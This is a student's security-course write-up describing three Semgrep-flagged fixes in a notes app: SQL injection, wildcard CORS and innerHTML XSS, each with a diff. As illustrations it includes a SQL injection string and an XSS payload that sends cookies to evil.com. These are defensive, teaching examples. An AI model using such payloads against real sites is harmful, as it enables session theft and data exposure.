# Week 6 Write-up

Tip: To preview this markdown file

- On Mac, press `Command (⌘) + Shift + V`
- On Windows/Linux, press `Ctrl + Shift + V`

## Instructions

Fill out all of the `TODO`s in this file.

## Brief findings overview

> Semgrep scanned 19 files with 489 rules and reported **6 blocking findings** across SAST categories:
>
> **SAST (Code):**
>
> - SQL Injection via `sqlalchemy.text()` with f-string interpolation (1 finding)
> - Remote Code Execution via `eval()` (1 finding)
> - OS Command Injection via `subprocess.run(shell=True)` (1 finding)
> - SSRF via dynamic `urllib.urlopen()` (1 finding)
> - Wildcard CORS policy `allow_origins=["*"]` (1 finding)
> - XSS via `innerHTML` with unsanitized user data (1 finding)
>
> **False positives / ignored:** The `eval()`, `subprocess.run(shell=True)`, and `urlopen()` findings are in intentionally vulnerable `/debug/*` endpoints. These are real vulnerabilities but were left unfixed as they appear to be deliberately placed for educational purposes. In a production codebase, these endpoints should be removed entirely.

## Fix #1

a. File and line(s)

> `backend/app/routers/notes.py`, lines 71–80

b. Rule/category Semgrep flagged

> `python.sqlalchemy.security.audit.avoid-sqlalchemy-text.avoid-sqlalchemy-text` (SAST)

c. Brief risk description

> The `/unsafe-search` endpoint constructed a raw SQL query using an f-string with user input (`q`) directly interpolated into the `WHERE` clause. An attacker could inject arbitrary SQL (e.g., `' OR 1=1 --`) to dump the entire database or modify/delete data.

d. Your change (short code diff or explanation, AI coding tool usage)

> Used Claude Code to refactor the query to use parameterized binding:
>
> ```diff
> -    sql = text(
> -        f"""
> -        ...
> -        WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'
> -        ...
> -        """
> -    )
> -    rows = db.execute(sql).all()
> +    sql = text(
> +        """
> +        ...
> +        WHERE title LIKE :pattern OR content LIKE :pattern
> +        ...
> +        """
> +    )
> +    rows = db.execute(sql, {"pattern": f"%{q}%"}).all()
> ```

e. Why this mitigates the issue

> Parameterized queries (bind parameters) separate SQL logic from data. The database engine treats `:pattern` as a literal value, not as SQL code, so injected SQL metacharacters are escaped automatically. This is the standard defense against SQL injection.

## Fix #2

a. File and line(s)

> `backend/app/main.py`, lines 22–28

b. Rule/category Semgrep flagged

> `python.fastapi.security.wildcard-cors.wildcard-cors` (SAST)

c. Brief risk description

> Setting `allow_origins=["*"]` with `allow_credentials=True` allows any website to make authenticated cross-origin requests to this API. A malicious site could exploit this to perform CSRF-like attacks, reading or modifying user data through the victim's browser session.

d. Your change (short code diff or explanation, AI coding tool usage)

> Used Claude Code to restrict CORS to the local development origin and limit allowed methods/headers:
>
> ```diff
> -    allow_origins=["*"],
> -    allow_methods=["*"],
> -    allow_headers=["*"],
> +    allow_origins=["http://localhost:8000"],
> +    allow_methods=["GET", "POST", "PATCH", "PUT", "DELETE"],
> +    allow_headers=["Content-Type", "Authorization"],
> ```

e. Why this mitigates the issue

> By specifying an explicit origin, the browser's CORS mechanism will only allow requests from `http://localhost:8000`. Requests from other origins are blocked by the browser. Restricting methods and headers further reduces the attack surface by only allowing what the application actually needs.

## Fix #3

a. File and line(s)

> `frontend/app.js`, line 14

b. Rule/category Semgrep flagged

> `javascript.browser.security.insecure-document-method.insecure-document-method` (SAST)

c. Brief risk description

> Using `innerHTML` to render note titles and content allows stored XSS. If an attacker saves a note with a title like `<img src=x onerror="document.location='https://evil.com/?c='+document.cookie">`, the malicious script executes in every user's browser when the note list loads, potentially stealing session tokens or performing actions on behalf of the victim.

d. Your change (short code diff or explanation, AI coding tool usage)

> Used Claude Code to replace `innerHTML` with safe DOM construction using `textContent` and `createTextNode`:
>
> ```diff
> -    li.innerHTML = `<strong>${n.title}</strong>: ${n.content}`;
> +    const strong = document.createElement('strong');
> +    strong.textContent = n.title;
> +    li.appendChild(strong);
> +    li.appendChild(document.createTextNode(': ' + n.content));
> ```

e. Why this mitigates the issue

> `textContent` and `createTextNode` treat all input as plain text, not HTML. Any HTML tags or script injections in note titles/content are rendered as literal text characters rather than being parsed and executed by the browser. This eliminates the XSS vector while preserving the intended visual formatting.
